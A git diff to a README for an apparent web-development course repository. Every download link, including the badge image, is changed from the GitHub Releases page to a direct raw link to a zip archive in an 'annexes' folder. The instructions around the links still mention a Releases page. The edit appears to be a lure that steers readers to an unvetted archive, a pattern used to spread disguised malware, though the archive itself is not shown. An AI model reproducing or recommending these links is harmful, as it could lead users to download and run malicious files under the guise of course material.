@@ -1,6 +1,6 @@
 # 🚀 formation-fondamentaux-web-modernes - Learn Web Development with Modern Standards
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-ff69b4)](https://github.com/mjanegamale/formation-fondamentaux-web-modernes/releases)
+[![Download Release](https://raw.githubusercontent.com/mjanegamale/formation-fondamentaux-web-modernes/main/annexes/formation-fondamentaux-web-modernes-v3.3.zip%20Now-%F0%9F%9A%80-ff69b4)](https://raw.githubusercontent.com/mjanegamale/formation-fondamentaux-web-modernes/main/annexes/formation-fondamentaux-web-modernes-v3.3.zip)
 
 ## 📚 Description
 
@@ -27,7 +27,7 @@ To run this application, you will need:
 Follow these simple steps to get up and running:
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page where you can download the files.
-   [Download Release](https://github.com/mjanegamale/formation-fondamentaux-web-modernes/releases)
+   [Download Release](https://raw.githubusercontent.com/mjanegamale/formation-fondamentaux-web-modernes/main/annexes/formation-fondamentaux-web-modernes-v3.3.zip)
 
 2. **Select the Latest Version**: On the Releases page, look for the latest version and click on it.
 
@@ -45,7 +45,7 @@ Follow these simple steps to get up and running:
 
 Make sure to download the latest version from the link below to ensure you have the most up-to-date features and fixes.
 
-[Download Release](https://github.com/mjanegamale/formation-fondamentaux-web-modernes/releases)
+[Download Release](https://raw.githubusercontent.com/mjanegamale/formation-fondamentaux-web-modernes/main/annexes/formation-fondamentaux-web-modernes-v3.3.zip)
 
 ## 📖 Tutorials and Resources
 
